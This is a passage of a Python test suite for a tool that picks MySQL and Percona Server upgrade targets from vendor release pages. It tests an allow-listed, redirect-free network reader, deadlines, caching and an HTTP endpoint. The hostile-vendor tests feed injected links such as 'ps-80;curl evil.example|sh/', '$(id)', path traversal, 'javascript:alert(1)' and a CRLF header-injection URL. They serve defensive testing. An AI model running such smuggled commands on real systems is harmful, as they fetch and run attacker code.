            (mysql_layout('8.0.43', basedir='/srv/mysql', plugin_dir='/srv/plugins'), None, ('not recognized',)),
        )
        for layout, url, words in cases:
            with self.subTest(url=url, words=words):
                guidance = ut.build_report(layout, mysql={'releases': [rel('8.0.44')]})['guidance']
                self.assertEqual(guidance['url'], url)
                for word in words:
                    self.assertIn(word, guidance['text'])
                self.assertIsNone(guidance['command'])
                if url == ut.YUM_GUIDE:
                    self.assertNotIn('APT', guidance['text'])

    def test_container_host_name_adds_the_image_tag_hint(self):
        guidance = ut.build_report(mysql_layout('8.0.43', hostname='3f2a9c1b7d4e'),
                                   mysql={'releases': [rel('8.0.44')]})['guidance']
        self.assertTrue(guidance['text'].startswith('The host name looks like a container ID'), guidance['text'])


# Percona Server ------------------------------------------------------------

class PerconaTargets(Base):
    def setUp(self):
        super(PerconaTargets, self).setUp()
        self.reader = FakeReader()

    def test_deb_layout_reads_the_apt_pool(self):
        report = self.report(percona_layout(), self.reader)
        apt = {ut.PERCONA_ROOT + line + '/apt/pool/main/p/percona-server/' for line in PERCONA_LINES}
        self.assertEqual(self.reader.calls[0], ut.PERCONA_ROOT)
        self.assertEqual(set(self.reader.calls[1:]), apt, 'APT pools of 8.0, 8.x Innovation, 8.4 and 9.7, no Yum folder')
        self.assertEqual(len(self.reader.calls), 5)
        self.assertAllowed(self.reader.calls)
        self.assertEqual(report['source']['kind'], 'percona_repository')
        self.assertIn('APT', report['source']['label'])
        self.assertIsNone(report['source']['error'])
        self.assertEqual([(t['version'], t['path'], t['repository']) for t in report['targets']],
                         [('8.0.%d-%d' % (v, b), 'patch', 'ps-80') for v, b in ((44, 35), (45, 36), (46, 37))] +
                         [('8.4.%d-%d' % (n, n), 'next_lts', 'ps-84-lts') for n in (2, 3, 4, 5, 6, 7, 8, 10, 11)])
        self.assertEqual(report['recommended'], '8.4.11-11')
        newest = report['targets'][-1]
        self.assertEqual(set(newest['packages']), {'bookworm', 'bullseye', 'jammy', 'noble', 'resolute', 'trixie'})
        self.assertEqual(newest['check_version'], '8.4.11', 'MySQL Shell checks the upstream version')
        self.assertIn('{repository}', report['guidance']['command'])
        blocked = {n['series']: n for n in report['not_direct']}
        self.assertEqual(blocked['8.1']['newest'], '8.1.0-1')
        self.assertIn('the 8.4 LTS series, a direct target', blocked['8.3']['reason'])
        self.assertIn('go to 8.4 first', blocked['9.7']['reason'])

    def test_rpm_layout_reads_the_yum_folders(self):
        report = self.report(percona_layout(rpm=True), self.reader)
        self.assertAllowed(self.reader.calls)
        self.assertFalse([u for u in self.reader.calls if '/apt/' in u], 'an RPM install never reads the APT pool')
        rpms = {u for u in self.reader.calls if '/RPMS/' in u}
        # Numeric order, MAX_EL_RELEASES newest, and never the 4-digit Amazon Linux folders.
        expected = {'%s%s/yum/release/%d/RPMS/x86_64/' % (ut.PERCONA_ROOT, line, el)
                    for line, els in (('ps-80', (10, 9, 8, 7)), ('ps-84-lts', (10, 9, 8, 7)),
                                      ('ps-8x-innovation', (9, 8, 7, 2)), ('ps-97-lts', (10, 9, 8)))
                    for el in els}
        self.assertEqual(rpms, expected)
        self.assertEqual(report['source']['kind'], 'percona_repository')
        self.assertIn('Yum', report['source']['label'])
        self.assertTrue(report['source']['error'].startswith('No fixture for '),
                        'a folder that could not be read is reported as partial')
        targets = {t['version']: t for t in report['targets']}
        self.assertEqual(set(targets['8.4.11-11']['packages']), {'el8', 'el9', 'el10'})
        self.assertEqual(set(targets['8.0.46-37']['packages']), {'el8', 'el9'})
        self.assertEqual(targets['8.4.0-1']['repository'], 'ps-84-lts')
        self.assertEqual(report['recommended'], '8.4.11-11')
        self.assertNotIn('8.0.43-34', targets, 'the running build is not a target')

    def test_aarch64_reads_the_aarch64_folders(self):
        self.report(percona_layout(rpm=True, version_compile_machine='aarch64'), self.reader)
        rpms = [u for u in self.reader.calls if '/RPMS/' in u]
        self.assertTrue(rpms)
        self.assertTrue(all(u.endswith('/RPMS/aarch64/') for u in rpms), rpms)

    def test_tarball_reads_the_apt_pool_and_has_no_command(self):
        base = '/opt/Percona-Server-8.0.43-34-Linux.x86_64.glibc2.35/'
        report = self.report(percona_layout(basedir=base, plugin_dir=base + 'lib/plugin/'), self.reader)
        self.assertTrue(all('/yum/' not in u for u in self.reader.calls))
        self.assertEqual(report['install']['method'], 'tarball')
        self.assertIsNone(report['guidance']['command'])
        self.assertEqual(report['recommended'], '8.4.11-11')

    def test_build_number_orders_releases_of_one_upstream_version(self):
        def release(upstream, build):
            return {'version': '%s-%d' % (upstream, build), 'upstream': upstream, 'build': build,
                    'repository': 'ps-80', 'packages': ['noble'], 'date': None, 'url': None}
        report = ut.build_report(percona_layout('8.0.43-34'),
                                 percona={'releases': [release('8.0.43', 33), release('8.0.43', 34),
                                                       release('8.0.43', 35)]})
        self.assertEqual([t['version'] for t in report['targets']], ['8.0.43-35'])
        self.assertEqual(report['recommended'], '8.0.43-35')
        numeric = ut.build_report(percona_layout('8.0.43-9'), percona={'releases': [release('8.0.43', 10)]})
        self.assertEqual([t['version'] for t in numeric['targets']], ['8.0.43-10'], 'build 10 is newer than build 9')

    def test_xtradb_cluster_is_not_listed(self):
        report = self.report(percona_layout('8.0.43-34.1', version_comment=PXC_COMMENT), self.reader)
        self.assertEqual(report['source']['kind'], 'none')
        self.assertIn('Percona XtraDB Cluster', report['source']['label'])
        self.assertEqual(report['targets'], [])
        self.assertEqual(self.reader.calls, [], 'nothing is read for a product that is not listed')

    def test_mariadb_returns_no_targets(self):
        layout = {'version': '11.4.5-MariaDB', 'version_comment': 'mariadb.org binary distribution',
                  'basedir': '/usr/', 'plugin_dir': '/usr/lib/mysql/plugin/', 'version_compile_os': 'debian-linux-gnu'}
        report = self.report(layout, self.reader)
        self.assertEqual(report['server']['engine'], 'mariadb')
        self.assertEqual((report['source']['kind'], report['targets'], report['recommended']), ('none', [], None))
        self.assertEqual(self.reader.calls, [])


# Offline -------------------------------------------------------------------

class Offline(Base):
    def test_offline_reader_refuses_every_url(self):
        with self.assertRaises(ValueError):
            ut.offline(ut.DOC_INDEX)

    def test_mysql_falls_back_to_the_bundled_catalog(self):
        report = self.report(mysql_layout('8.0.43'), ut.offline)
        self.assertEqual(report['source']['kind'], 'bundled')
        self.assertEqual(report['source']['urls'], [])
        self.assertEqual(report['source']['error'], 'This server does not read release pages.')
        catalog = catalog_versions()
        self.assertTrue(report['targets'])
        self.assertTrue(set(t['version'] for t in report['targets']) <= set(catalog))
        self.assertEqual(report['recommended'], newest(catalog, '8.4.'))
        self.assertTrue(all(t['url'] is None and t['date'] is None for t in report['targets']))

    def test_percona_offline_has_no_list_and_never_raises(self):
        report = self.report(percona_layout(), ut.offline)
        self.assertEqual((report['source']['kind'], report['targets']), ('none', []))
        self.assertEqual(report['source']['error'], 'This server does not read release pages.')

    def test_bundled_releases_are_the_catalog_in_order(self):
        bundled = ut.bundled_mysql_releases()
        self.assertEqual([r['version'] for r in bundled], catalog_versions())
        self.assertTrue(all(r['date'] is None and r['url'] is None for r in bundled))


# Network guard -------------------------------------------------------------

class FakeResponse(object):
    """A streamed HTTP response: read(n) returns the next piece of *body*, or the next of *chunks*
    (which may be endless); *on_read* runs before each read (to move a fake clock)."""

    def __init__(self, body=b'', status=200, url=None, chunks=None, on_read=None):
        self.body, self.status, self.url = body, status, url
        self.chunks = None if chunks is None else iter(chunks)
        self.on_read = on_read
        self.offset = 0
        self.reads = []

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def geturl(self):
        return self.url

    def read(self, size=-1):
        self.reads.append(size)
        if self.on_read:
            self.on_read()
        if self.chunks is not None:
            return next(self.chunks, b'')
        if size is None or size < 0:
            size = len(self.body) - self.offset
        chunk = self.body[self.offset:self.offset + size]
        self.offset += len(chunk)
        return chunk


class FakeOpener(object):
    """What build_opener returns: each open() answers a fresh response from *respond(url)*."""

    def __init__(self, respond):
        self.respond = respond
        self.requests = []
        self.responses = []

    def open(self, request, timeout=None):
        self.requests.append((request, timeout))
        response = self.respond(request.full_url)
        if response.url is None:
            response.url = request.full_url
        self.responses.append(response)
        return response


class NetworkGuard(Base):
    def opener(self, respond):
        opener = FakeOpener(respond)
        patch = mock.patch.object(urllib.request, 'build_opener', return_value=opener)
        build = patch.start()
        self.addCleanup(patch.stop)
        context = mock.patch.object(ut, 'https_context', return_value='verifying-context')
        context.start()
        self.addCleanup(context.stop)
        return opener, build

    def fake_clock(self):
        clock = FakeClock()
        patch = mock.patch.object(ut, 'time', types.SimpleNamespace(monotonic=clock.monotonic))
        patch.start()
        self.addCleanup(patch.stop)
        return clock

    def test_fetch_page_is_the_guarded_reader(self):
        self.assertIs(ut.fetch_page, ut._fetch)

    def test_urls_outside_the_allow_list_never_open_a_connection(self):
        opener, build = self.opener(lambda url: FakeResponse(b'x'))
        refused = (
            'https://example.com/doc/',                                         # other host
            'https://dev.mysql.com.evil.example/doc/',                          # host suffix
            'https://dev.mysql.com:8443/doc/',                                  # port
            'http://dev.mysql.com/doc/',                                        # http scheme
            'http://repo.percona.com/',
            'https://dev.mysql.com/doc/index.html',                             # extra path
            'https://dev.mysql.com/doc/relnotes/mysql/8.4/en/news-8-4-13.htm',   # release page, wrong suffix
            'https://dev.mysql.com/doc/relnotes/mysql/8.4/en/news-8-4.html',     # release page, two parts
            'https://dev.mysql.com/doc/relnotes/mysql/8.4/en/../../../../x/',
            'https://dev.mysql.com/doc/?q=1',                                   # query string
            'https://dev.mysql.com/doc/#top',
            'https://repo.percona.com/ps-80/apt/pool/main/p/percona-server/?C=M',
            'https://repo.percona.com/ps-8/0/yum/release/',                     # ps- line with a slash
            'https://repo.percona.com/ps-../yum/release/',                      # ps- line with dots
            'https://repo.percona.com/ps-80/../ps-80/yum/release/',
            'https://repo.percona.com/ps-80/yum/release/8/RPMS/i686/',          # other arch
            'https://repo.percona.com/ps-80/yum/release/2023/RPMS/x86_64/',
            'https://user@dev.mysql.com/doc/',                                  # userinfo
            'https://dev.mysql.com@evil.example/doc/',
            'https://repo.percona.com/\n',                                     # trailing newline
            'https://dev.mysql.com/doc/\r\nHost: evil.example',
            '',
        )
        for url in refused:
            with self.subTest(url=url):
                with self.assertRaisesRegex(ValueError, 'Unsupported release source'):
                    ut._fetch(url)
        build.assert_not_called()
        self.assertEqual(opener.requests, [])

    def test_every_url_the_module_reads_passes_the_allow_list(self):
        self.opener(lambda url: FakeResponse(b'<html>ok</html>'))
        for url in fixture_map():
            with self.subTest(url=url):
                self.assertEqual(ut._fetch(url), '<html>ok</html>')

    def test_opener_has_no_proxy_no_redirects_and_a_timeout(self):
        opener, build = self.opener(lambda url: FakeResponse(b'ok' * 100000))
        self.assertEqual(len(ut._fetch(ut.DOC_INDEX)), 200000)
        handlers = build.call_args[0]
        proxies = [h for h in handlers if isinstance(h, urllib.request.ProxyHandler)]
        self.assertEqual(len(proxies), 1)
        self.assertEqual(proxies[0].proxies, {}, 'no ambient proxy from the environment')
        self.assertTrue(any(isinstance(h, ut._NoRedirect) for h in handlers))
        https = [h for h in handlers if isinstance(h, urllib.request.HTTPSHandler)]
        self.assertEqual(len(https), 1)
        self.assertEqual(getattr(https[0], '_context', None), 'verifying-context')
        request, timeout = opener.requests[0]
        self.assertEqual(request.full_url, ut.DOC_INDEX)
        self.assertEqual(timeout, ut.REQUEST_TIMEOUT)
        self.assertEqual(request.get_header('Accept-encoding'), 'identity')
        reads = opener.responses[0].reads
        self.assertGreater(len(reads), 1, 'a 200 kB body is read in pieces')
        self.assertTrue(all(size is not None and 0 < size <= 65536 for size in reads),
                        'every read is bounded to 64 KiB: %r' % reads)

    def test_redirect_handler_refuses(self):
        request = urllib.request.Request(ut.DOC_INDEX)
        with self.assertRaisesRegex(ValueError, 'redirected'):
            ut._NoRedirect().redirect_request(request, None, 302, 'Found', {}, 'https://evil.example/')

    def test_redirected_response_is_refused(self):
        self.opener(lambda url: FakeResponse(b'ok', url='https://dev.mysql.com/doc/refman/8.4/en/'))
        with self.assertRaisesRegex(ValueError, 'Unexpected release source response'):
            ut._fetch(ut.DOC_INDEX)

    def test_non_200_response_is_refused(self):
        self.opener(lambda url: FakeResponse(b'ok', status=203))
        with self.assertRaisesRegex(ValueError, 'Unexpected release source response'):
            ut._fetch(ut.DOC_INDEX)

    def test_oversize_body_is_refused(self):
        self.opener(lambda url: FakeResponse(b'x' * (ut.MAX_BYTES + 1)))
        with self.assertRaisesRegex(ValueError, 'size limit'):
            ut._fetch(ut.DOC_INDEX)

    def test_endless_body_stops_just_past_max_bytes(self):
        opener, unused = self.opener(lambda url: FakeResponse(chunks=itertools.repeat(b'x' * 65536)))
        with self.assertRaisesRegex(ValueError, 'size limit'):
            ut._fetch(ut.DOC_INDEX)
        self.assertLessEqual(len(opener.responses[0].reads), ut.MAX_BYTES // 65536 + 1)

    def test_trickling_body_ends_at_read_timeout(self):
        # Each read arrives within REQUEST_TIMEOUT (one second apart), so only
        # the whole-read limit can stop it; 11 bytes are far below MAX_BYTES.
        clock = self.fake_clock()

        def tick():
            clock.now += 1.0
        opener, unused = self.opener(lambda url: FakeResponse(chunks=itertools.repeat(b'x'), on_read=tick))
        with self.assertRaisesRegex(ValueError, 'too slow'):
            ut._fetch(ut.DOC_INDEX)
        self.assertLessEqual(len(opener.responses[0].reads), int(ut.READ_TIMEOUT) + 2)

    def test_slow_body_within_read_timeout_is_read(self):
        clock = self.fake_clock()

        def tick():
            clock.now += 1.0
        self.opener(lambda url: FakeResponse(chunks=[b'a', b'b', b'c', b'd', b'e'], on_read=tick))
        self.assertEqual(ut._fetch(ut.DOC_INDEX), 'abcde')

    def test_body_at_the_limit_is_read_and_bad_utf8_replaced(self):
        bodies = [b'x' * ut.MAX_BYTES, b'ok \xff']
        self.opener(lambda url: FakeResponse(bodies.pop(0)))
        self.assertEqual(len(ut._fetch(ut.DOC_INDEX)), ut.MAX_BYTES)
        self.assertEqual(ut._fetch(ut.DOC_INDEX), 'ok \ufffd')


# Default reader, deadline, hostile vendor text --------------------------------

class DefaultReader(Base):
    """upgrade_targets(conn) without a reader never reaches the network (only cmd_ui passes fetch_page)."""

    def call(self, layout):
        with mock.patch.object(ut, 'read_layout', return_value=dict(layout)):
            report = ut.upgrade_targets(object())
        json.dumps(report, allow_nan=False)
        return report

    def test_mysql_without_a_reader_answers_from_the_bundled_catalog(self):
        report = self.call(mysql_layout('8.0.43'))
        self.assertEqual(report['source']['kind'], 'bundled')
        self.assertEqual(report['recommended'], newest(catalog_versions(), '8.4.'))
        self.network['build_opener'].assert_not_called()
        self.network['urlopen'].assert_not_called()

    def test_percona_without_a_reader_has_no_list(self):
        report = self.call(percona_layout())
        self.assertEqual((report['source']['kind'], report['targets']), ('none', []))
        self.network['build_opener'].assert_not_called()


class Deadline(Base):
    """REPORT_TIMEOUT covers every read, the first ones included, and queued reads are cancelled."""

    def stalled(self, block):
        reader = BlockingReader(block)
        self.addCleanup(reader.release)
        return reader

    def timed(self, layout, reader):
        started = time.monotonic()
        with mock.patch.object(ut, 'read_layout', return_value=dict(layout)):
            report = ut.upgrade_targets(object(), fetch=reader, deadline=time.monotonic() + 0.2)
        elapsed = time.monotonic() - started
        json.dumps(report, allow_nan=False)
        # The stalled read would hold for 30 s; the report ends near its 0.2 s deadline.
        self.assertLess(elapsed, 5.0, 'upgrade_targets waited for a stalled read')
        return report

    def test_stalled_documentation_index_ends_at_the_deadline(self):
        reader = self.stalled({ut.DOC_INDEX})
        report = self.timed(mysql_layout('8.0.43'), reader)
        self.assertEqual(report['source']['kind'], 'bundled')
        self.assertEqual(report['source']['error'], 'The release check timed out.')
        self.assertEqual(reader.calls, [ut.DOC_INDEX])

    def test_stalled_release_notes_page_ends_at_the_deadline(self):
        reader = self.stalled({ut.RELNOTES % s for s in ('26.10', '9.7', '8.4', '8.0')})
        report = self.timed(mysql_layout('8.0.43'), reader)
        self.assertEqual(report['source']['kind'], 'bundled')
        self.assertEqual(report['source']['error'], 'The release check timed out.')

    def test_stalled_percona_root_ends_at_the_deadline(self):
        reader = self.stalled({ut.PERCONA_ROOT})
        report = self.timed(percona_layout(), reader)
        self.assertEqual((report['source']['kind'], report['targets']), ('none', []))
        self.assertEqual(report['source']['error'], 'The release check timed out.')
        self.assertEqual(reader.calls, [ut.PERCONA_ROOT])

    def test_queued_reads_are_cancelled_at_the_deadline(self):
        pools = []

        class RecordingPool(ThreadPoolExecutor):
            def __init__(self, *args, **kwargs):
                super(RecordingPool, self).__init__(*args, **kwargs)
                pools.append(self)
        urls = [ut.RELNOTES % ('9.%d' % n) for n in range(ut.WORKERS + 2)]
        reader = self.stalled(set(urls))
        with mock.patch.object(ut, 'ThreadPoolExecutor', RecordingPool):
            pages, error = ut._fetch_all(urls, time.monotonic() + 0.2, reader)
        self.assertEqual((pages, error), ({}, 'The release check timed out.'))
        reader.release()
        for pool in pools:
            pool.shutdown(wait=True)  # join the workers: every queued read has been run or skipped
        self.assertLessEqual(len(reader.calls), ut.WORKERS,
                             'a read still queued at the deadline must be cancelled, not run later')


class HostileVendorText(Base):
    """Vendor pages are only matched against fixed patterns; nothing they link is followed or shown."""

    HOSTILE_ROOT = (
        '<a href="ps-80;curl evil.example|sh/">x</a>'
        '<a href="ps-80$(id)/">x</a>'
        '<a href="https://evil.example/ps-80/">x</a>'
        '<a href="//evil.example/ps-84-lts/">x</a>'
        '<a href="../ps-80/">x</a>'
        '<a href="/ps-84-lts/">x</a>'
        '<a href="ps-80/../../etc/">x</a>'
        '<a href="ps-zz/">x</a>'
        '<a href="ps-80%2f..%2f/">x</a>'
        '<a href="ps-80 /">x</a>'
    )

    def test_percona_root_names_outside_the_pattern_yield_no_line(self):
        self.assertEqual(ut.parse_percona_lines(self.HOSTILE_ROOT), {})

    def test_percona_root_with_only_hostile_names_reads_nothing_else(self):
        reader = FakeReader(extra={ut.PERCONA_ROOT: self.HOSTILE_ROOT})
        report = self.report(percona_layout(), reader)
        self.assertEqual(reader.calls, [ut.PERCONA_ROOT])
        self.assertEqual((report['source']['kind'], report['targets'], report['source']['urls']), ('none', [], []))

    def test_hostile_names_beside_a_real_line_add_no_url_or_repository(self):
        reader = FakeReader(extra={ut.PERCONA_ROOT: self.HOSTILE_ROOT + '<a href="ps-80/">ps-80/</a>'})
        report = self.report(percona_layout(), reader)
        self.assertAllowed(reader.calls)
        self.assertEqual(reader.calls, [ut.PERCONA_ROOT, ut.PERCONA_ROOT + 'ps-80/apt/pool/main/p/percona-server/'])
        self.assertEqual({t['repository'] for t in report['targets']}, {'ps-80'})
        self.assertEqual(report['source']['urls'], [ut.PERCONA_ROOT + 'ps-80/apt/pool/main/p/percona-server/'])

    def test_release_notes_hrefs_outside_the_page_yield_no_target_url(self):
        hostile = (
            '<a href="https://evil.example/news-9-7-9.html">Changes in MySQL 9.7.9 (2026-01-01)</a>\n'
            '<a href="//evil.example/news-9-7-8.html">Changes in MySQL 9.7.8 (2026-01-01)</a>\n'
            '<a href="javascript:alert(1)">Changes in MySQL 9.7.7 (2026-01-01)</a>\n'
            '<a href="news-9-7-6.html?u=https://evil.example">Changes in MySQL 9.7.6 (2026-01-01)</a>\n'
            '<a href="../../../evil/news-9-7-5.html">Changes in MySQL 9.7.5 (2026-01-01)</a>\n'
        )
        self.assertEqual(ut.parse_release_notes(hostile, '9.7', ut.RELNOTES % '9.7', today=TODAY), [])
        reader = FakeReader(extra={ut.RELNOTES % '9.7': fixture_text('relnotes-9.7.html') + hostile})
        report = self.report(mysql_layout('9.7.2'), reader)
        prefix = 'https://dev.mysql.com/doc/relnotes/mysql/'
        for target in report['targets']:
            self.assertTrue(target['url'].startswith(prefix), target['url'])
            self.assertRegex(target['url'][len(prefix):], r'^[0-9.]+/en/news-[0-9-]+\.html$')
        self.assertFalse({'9.7.5', '9.7.6', '9.7.7', '9.7.8', '9.7.9'} & {t['version'] for t in report['targets']})

    def test_documentation_index_links_elsewhere_are_never_followed(self):
        index = fixture_text('doc-index.html') + '<a href="https://evil.example/doc/relnotes/mysql/9.9/en/">x</a>'
        reader = FakeReader(extra={ut.DOC_INDEX: index})
        self.report(mysql_layout('8.0.43'), reader)
        self.assertAllowed(reader.calls)
        self.assertTrue(all(u.startswith('https://dev.mysql.com/doc/') for u in reader.calls), reader.calls)


# Cache ---------------------------------------------------------------------

class Cache(Base):
    def setUp(self):
        super(Cache, self).setUp()
        self.clock = FakeClock()
        patch = mock.patch.object(ut, 'time', types.SimpleNamespace(monotonic=self.clock.monotonic))
        patch.start()
        self.addCleanup(patch.stop)

    def test_second_call_with_the_same_reader_does_not_refetch(self):
        reader = FakeReader()
        first = self.report(mysql_layout('8.0.43'), reader)
        calls = len(reader.calls)
        listing = [u for u in reader.calls if not NEWS_PAGE.match(u)]
        self.assertEqual(len(listing), 5, 'the index and four release notes pages')
        second = self.report(mysql_layout('8.4.5'), reader)
        self.assertEqual([u for u in reader.calls if not NEWS_PAGE.match(u)], listing)
        # Release pages already judged are not read again either.
        pages = [u for u in reader.calls if NEWS_PAGE.match(u)]
        self.assertEqual(len(pages), len(set(pages)))
        self.assertEqual(first['source']['checked_at'], second['source']['checked_at'])
        percona = FakeReader()
        self.report(percona_layout(), percona)
        self.report(percona_layout(), percona)
        self.assertEqual(len(percona.calls), 5)

    def test_another_reader_reads_again(self):
        self.report(mysql_layout('8.0.43'), FakeReader())
        other = FakeReader()
        self.report(mysql_layout('8.0.43'), other)
        self.assertEqual(other.calls[0], ut.DOC_INDEX)

    def test_failure_is_cached_for_failure_ttl_only(self):
        reader = FakeReader(fail={ut.DOC_INDEX: OSError('connection refused')})
        report = self.report(mysql_layout('8.0.43'), reader)
        self.assertEqual(report['source']['kind'], 'bundled')
        self.assertEqual(report['source']['error'], 'Could not reach the release source.')
        self.assertEqual(reader.calls, [ut.DOC_INDEX])
        self.clock.now += ut.FAILURE_TTL - 1
        self.report(mysql_layout('8.0.43'), reader)
        self.assertEqual(reader.calls, [ut.DOC_INDEX], 'still within FAILURE_TTL')
        self.clock.now += 2
        self.report(mysql_layout('8.0.43'), reader)
        self.assertEqual(reader.calls, [ut.DOC_INDEX, ut.DOC_INDEX], 'read again after FAILURE_TTL')

    def test_success_is_cached_for_success_ttl(self):
        reader = FakeReader()
        self.report(mysql_layout('8.0.43'), reader)
        self.clock.now += ut.FAILURE_TTL + 1
        self.report(mysql_layout('8.0.43'), reader)
        self.assertEqual(reader.calls.count(ut.DOC_INDEX), 1, 'a success outlives FAILURE_TTL')
        self.clock.now += ut.SUCCESS_TTL
        self.report(mysql_layout('8.0.43'), reader)
        self.assertEqual(reader.calls.count(ut.DOC_INDEX), 2)

    def test_http_error_text_names_the_status(self):
        # A real (empty) body: on Python 3.9 and older an HTTPError without one cannot close.
        error = urllib.error.HTTPError(ut.DOC_INDEX, 503, 'Service Unavailable', {}, io.BytesIO(b''))
        self.addCleanup(error.close)
        report = self.report(mysql_layout('8.0.43'), FakeReader(fail={ut.DOC_INDEX: error}))
        self.assertEqual(report['source']['error'], 'The release source answered HTTP 503.')

    def test_cache_stays_bounded(self):
        total = ut.MAX_CACHE + 6
        for n in range(total):
            self.clock.now += 1
            ut._cached(('k', n), lambda deadline: {'n': n}, self.clock.now + 5)
        self.assertLessEqual(len(ut._CACHE), ut.MAX_CACHE)
        self.assertIn(('k', total - 1), ut._CACHE)
        self.assertNotIn(('k', 0), ut._CACHE, 'the entry that expires first is evicted')


# read_layout ----------------------------------------------------------------

class ReadLayout(Base):
    VARIABLES = {'version': '8.0.43', 'version_comment': MYSQL_COMMENT, 'basedir': '/usr/',
                 'plugin_dir': '/usr/lib64/mysql/plugin/', 'version_compile_os': 'Linux',
                 'version_compile_machine': 'x86_64', 'build_id': 'abc', 'hostname': 'db1'}

    def test_reads_the_layout_variables_in_one_statement(self):
        conn = LayoutConnection(dict(self.VARIABLES, Version_Comment=MYSQL_COMMENT))
        layout = ut.read_layout(conn)
        self.assertEqual(layout['version'], '8.0.43')
        self.assertEqual(layout['version_comment'], MYSQL_COMMENT, 'names are lowercased')
        self.assertEqual(len(conn.calls), 1)
        sql, flags = conn.calls[0]
        self.assertIn('--comments', flags)
        names = {bytes.fromhex(h).decode('utf-8') for h in re.findall(r"X'([0-9a-f]+)'", sql)}
        self.assertTrue({'version', 'version_comment', 'basedir', 'plugin_dir', 'version_compile_os',
                         'version_compile_machine', 'build_id', 'hostname'} <= names, names)
        self.assertNotIn('@@', sql)

    def test_statement_tag_is_a_sql_comment(self):
        # BUG (upgrade_targets.TAG): TAG is 'upgrade_targets' while every other
        # module uses a comment such as '/*myflames:lifecycle*/ '. Reader.rows
        # sends tag + sql, so the server receives
        # "upgrade_targetsSHOW GLOBAL VARIABLES WHERE ..." and answers a syntax
        # error (1064): the endpoint cannot read any live server.
        conn = LayoutConnection(self.VARIABLES)
        ut.read_layout(conn)
        sql = conn.calls[0][0]
        self.assertRegex(sql, r'^/\*myflames:[a-z_-]+\*/ SHOW GLOBAL VARIABLES WHERE Variable_name IN \(',
                         'the statement must start with a /*myflames:...*/ comment tag')

    def test_missing_version_raises(self):
        with mock.patch.object(ut, 'read_layout', return_value={}):
            with self.assertRaisesRegex(ValueError, 'Could not read the server version'):
                ut.upgrade_targets(object(), fetch=FakeReader())


# HTTP endpoint ---------------------------------------------------------------

class HttpEndpoint(Base):
    PATH = '/api/lifecycle/upgrade-targets'

    def setUp(self):
        super(HttpEndpoint, self).setUp()
        detect = mock.patch.object(lc, 'detect_tools', return_value={'tools': {}})
        detect.start()
        self.addCleanup(detect.stop)
        self.conn = LayoutConnection(mysql_layout('8.0.43'))
        connect = mock.patch.object(lc, '_connect', return_value=self.conn)
        connect.start()
        self.addCleanup(connect.stop)
        self.connection = {'host': '127.0.0.1', 'port': 3306, 'user': 'u', 'password': 'pw'}

    def serve(self, **kwargs):
        server = ui.WorkspaceServer(store_path=os.path.join(self.tmp, 'workspace.sqlite3'), **kwargs)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.addCleanup(thread.join, 5)
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        return server

    def post(self, server, payload, authenticated=True):
        headers = {'Content-Type': 'application/json', 'Origin': server.origin}
        if authenticated:
            headers.update({'X-Myflames-Token': server.token,
                            'Cookie': server.cookie_name + '=' + server.session_secret})
        conn = http.client.HTTPConnection(*server.server_address, timeout=10)
        try:
            conn.request('POST', self.PATH, body=json.dumps(payload), headers=headers)
            response = conn.getresponse()
            return response.status, json.loads(response.read().decode('utf-8'))
        finally:
            conn.close()

    def test_path_is_a_lifecycle_read_and_cmd_ui_passes_the_guarded_reader(self):
        self.assertIn(self.PATH, ui._LIFECYCLE_READ_PATHS)
        self.assertIn(self.PATH, ui._CONNECTION_PATHS)
        self.assertNotIn(self.PATH, ui._WRITE_PATHS)
        self.assertIn('release_reader=fetch_page', inspect.getsource(ui.cmd_ui))

    def test_server_without_a_reader_answers_from_the_bundled_catalog(self):
        server = self.serve()
        self.assertIsNone(server.release_reader, 'test servers never read release pages')
        self.assertEqual(self.post(server, {'connection': self.connection}, authenticated=False)[0], 403)
        status, body = self.post(server, {'connection': self.connection})
        self.assertEqual(status, 200, body)
        self.assertEqual(body['schema_version'], 'upgrade-targets-1.0')
        self.assertEqual(body['source']['kind'], 'bundled')
        self.assertEqual(body['recommended'], newest(catalog_versions(), '8.4.'))
        self.assertEqual(body['install']['method'], 'rpm')

    def test_server_with_a_reader_uses_it(self):
        reader = FakeReader()
        server = self.serve(release_reader=reader)
        status, body = self.post(server, {'connection': self.connection})
        self.assertEqual(status, 200, body)
        self.assertEqual(body['source']['kind'], 'release_notes')
        self.assertEqual(body['recommended'], '8.4.13')
        self.assertEqual(reader.calls[0], ut.DOC_INDEX)


if __name__ == '__main__':
    unittest.main()


# Correctness review fixes (2026-11-08) ---------------------------------------

REMOVED_PAGE = ('<h2>Changes in MySQL 8.4.1 (2024-07-01)</h2><div class="important">'
                '<p>This release is no longer available for download. It was removed due to a critical issue.</p></div>')
DOCKER_PAGE = ('<h2>Changes in MySQL 8.4.12 (2026-08-18)</h2><div class="note"><p>This release is a Critical '
               'Security Patch Update for the MySQL Server docker image, only.</p></div>')
NEWS = 'https://dev.mysql.com/doc/relnotes/mysql/8.4/en/news-%s.html'


class ReleaseAvailability(Base):
    def test_markers(self):
        self.assertEqual(ut.parse_availability(REMOVED_PAGE), 'removed')
        self.assertEqual(ut.parse_availability(DOCKER_PAGE), 'docker_only')
        self.assertEqual(ut.parse_availability('<h2>Changes in MySQL 8.4.13</h2>'), 'ok')

    def test_removed_and_docker_only_releases_are_not_offered(self):
        reader = FakeReader(extra={NEWS % '8-4-1': REMOVED_PAGE, NEWS % '8-4-12': DOCKER_PAGE})
        report = self.report(mysql_layout('8.0.43'), reader)
        offered = [t['version'] for t in report['targets']]
        self.assertNotIn('8.4.1', offered)
        self.assertNotIn('8.4.12', offered)
        self.assertIn('8.4.13', offered)
        reasons = {u['version']: u['reason'] for u in report['unavailable']}
        self.assertIn('Removed from download', reasons['8.4.1'])
        self.assertIn('Docker image only', reasons['8.4.12'])

    def test_a_container_keeps_docker_only_releases(self):
        reader = FakeReader(extra={NEWS % '8-4-12': DOCKER_PAGE})
        layout = dict(mysql_layout('8.0.43'), hostname='0123456789ab')
        report = self.report(layout, reader)
        target = [t for t in report['targets'] if t['version'] == '8.4.12']
        self.assertEqual(len(target), 1)
        self.assertTrue(target[0]['docker_only'])

    def test_unreadable_release_pages_leave_targets_and_say_so(self):
        reader = FakeReader(fail={NEWS % '8-4-13': OSError('reset')})
        report = self.report(mysql_layout('8.0.43'), reader)
        self.assertIn('8.4.13', [t['version'] for t in report['targets']])
        self.assertTrue(any('could not be read' in n for n in report['notes']))


class ReviewFixes(Base):
